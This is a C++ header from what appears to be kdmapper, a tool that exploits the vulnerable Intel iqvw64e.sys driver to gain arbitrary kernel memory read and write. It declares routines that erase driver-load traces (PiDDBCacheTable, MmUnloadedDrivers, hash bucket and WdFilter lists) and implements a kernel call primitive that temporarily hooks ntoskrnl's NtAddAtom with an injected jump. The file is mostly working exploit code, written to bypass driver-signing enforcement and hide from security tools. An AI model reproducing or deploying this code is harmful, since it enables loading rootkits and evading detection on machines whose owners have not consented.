#pragma once
#include <Windows.h>
#include <string>
#include <iostream>


#include "utils.hpp"
#include "nt.hpp"

namespace intel_driver
{
	constexpr ULONG32 ioctl1 = 0x80862007;
	constexpr DWORD iqvw64e_timestamp = 0x5284EAC3;
	extern ULONG64 ntoskrnlAddr;


	bool ClearPiDDBCacheTable(HANDLE device_handle);
	bool ExAcquireResourceExclusiveLite(HANDLE device_handle, PVOID Resource, BOOLEAN wait);
	bool ExReleaseResourceLite(HANDLE device_handle, PVOID Resource);
	BOOLEAN RtlDeleteElementGenericTableAvl(HANDLE device_handle, PVOID Table, PVOID Buffer);
	PVOID RtlLookupElementGenericTableAvl(HANDLE device_handle, nt::PRTL_AVL_TABLE Table, PVOID Buffer);
	nt::PiDDBCacheEntry* LookupEntry(HANDLE device_handle, nt::PRTL_AVL_TABLE PiDDBCacheTable, ULONG timestamp, const wchar_t * name);
	PVOID ResolveRelativeAddress(HANDLE device_handle, _In_ PVOID Instruction, _In_ ULONG OffsetOffset, _In_ ULONG InstructionSize);
	bool AcquireDebugPrivilege();

	uintptr_t FindPatternAtKernel(HANDLE device_handle, uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, const char* szMask);
	uintptr_t FindSectionAtKernel(HANDLE device_handle, const char* sectionName, uintptr_t modulePtr, PULONG size);
	uintptr_t FindPatternInSectionAtKernel(HANDLE device_handle, const char* sectionName, uintptr_t modulePtr, BYTE* bMask, const char* szMask);

	bool ClearKernelHashBucketList(HANDLE device_handle);
	bool ClearWdFilterDriverList(HANDLE device_handle);

	bool IsRunning();
	HANDLE Load();
	bool Unload(HANDLE device_handle);

	bool MemCopy(HANDLE device_handle, uint64_t destination, uint64_t source, uint64_t size);
	bool SetMemory(HANDLE device_handle, uint64_t address, uint32_t value, uint64_t size);
	bool GetPhysicalAddress(HANDLE device_handle, uint64_t address, uint64_t* out_physical_address);
	uint64_t MapIoSpace(HANDLE device_handle, uint64_t physical_address, uint32_t size);
	bool UnmapIoSpace(HANDLE device_handle, uint64_t address, uint32_t size);
	bool ReadMemory(HANDLE device_handle, uint64_t address, void* buffer, uint64_t size);
	bool WriteMemory(HANDLE device_handle, uint64_t address, void* buffer, uint64_t size);
	bool WriteToReadOnlyMemory(HANDLE device_handle, uint64_t address, void* buffer, uint32_t size);
	/*added by herooyyy*/
	uint64_t MmAllocateIndependentPagesEx(HANDLE device_handle, uint32_t size);
	bool MmFreeIndependentPages(HANDLE device_handle, uint64_t address, uint32_t size);
	BOOLEAN MmSetPageProtection(HANDLE device_handle, uint64_t address, uint32_t size, ULONG new_protect);
	
	uint64_t AllocatePool(HANDLE device_handle, nt::POOL_TYPE pool_type, uint64_t size);

	bool FreePool(HANDLE device_handle, uint64_t address);
	uint64_t GetKernelModuleExport(HANDLE device_handle, uint64_t kernel_module_base, const std::string& function_name);
	bool ClearMmUnloadedDrivers(HANDLE device_handle);
	std::wstring GetDriverNameW();
	std::wstring GetDriverPath();

	template<typename T, typename ...A>
	bool CallKernelFunction(HANDLE device_handle, T* out_result, uint64_t kernel_function_address, const A ...arguments) {
		constexpr auto call_void = std::is_same_v<T, void>;

		//if count of arguments is >4 fail
		static_assert(sizeof...(A) <= 4, "CallKernelFunction: Too many arguments, CallKernelFunction only can be called with 4 or less arguments");

		if constexpr (!call_void) {
			if (!out_result)
				return false;
		}
		else {
			UNREFERENCED_PARAMETER(out_result);
		}

		if (!kernel_function_address)
			return false;

		// Setup function call
		HMODULE ntdll = GetModuleHandleA("ntdll.dll");
		if (ntdll == 0) {
			Log(L"[-] Failed to load ntdll.dll" << std::endl); //never should happens
			return false;
		}

		const auto NtAddAtom = reinterpret_cast<void*>(GetProcAddress(ntdll, "NtAddAtom"));
		if (!NtAddAtom)
		{
			Log(L"[-] Failed to get export ntdll.NtAddAtom" << std::endl);
			return false;
		}

		uint8_t kernel_injected_jmp[] = { 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0 };
		uint8_t original_kernel_function[sizeof(kernel_injected_jmp)];
		*(uint64_t*)&kernel_injected_jmp[2] = kernel_function_address;

		static uint64_t kernel_NtAddAtom = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "NtAddAtom");
		if (!kernel_NtAddAtom) {
			Log(L"[-] Failed to get export ntoskrnl.NtAddAtom" << std::endl);
			return false;
		}

		if (!ReadMemory(device_handle, kernel_NtAddAtom, &original_kernel_function, sizeof(kernel_injected_jmp)))
			return false;

		if (original_kernel_function[0] == kernel_injected_jmp[0] &&
			original_kernel_function[1] == kernel_injected_jmp[1] &&
			original_kernel_function[sizeof(kernel_injected_jmp) - 2] == kernel_injected_jmp[sizeof(kernel_injected_jmp) - 2] &&
			original_kernel_function[sizeof(kernel_injected_jmp) - 1] == kernel_injected_jmp[sizeof(kernel_injected_jmp) - 1]) {
			Log(L"[-] FAILED!: The code was already hooked!! another instance of kdmapper running?!" << std::endl);
			return false;
		}

		// Overwrite the pointer with kernel_function_address
		if (!WriteToReadOnlyMemory(device_handle, kernel_NtAddAtom, &kernel_injected_jmp, sizeof(kernel_injected_jmp)))
			return false;

		// Call function
		if constexpr (!call_void) {
			using FunctionFn = T(__stdcall*)(A...);
			const auto Function = reinterpret_cast<FunctionFn>(NtAddAtom);

			*out_result = Function(arguments...);
		}
		else {
			using FunctionFn = void(__stdcall*)(A...);
			const auto Function = reinterpret_cast<FunctionFn>(NtAddAtom);

			Function(arguments...);
		}

		// Restore the pointer/jmp
		return WriteToReadOnlyMemory(device_handle, kernel_NtAddAtom, original_kernel_function, sizeof(kernel_injected_jmp));
	}
}
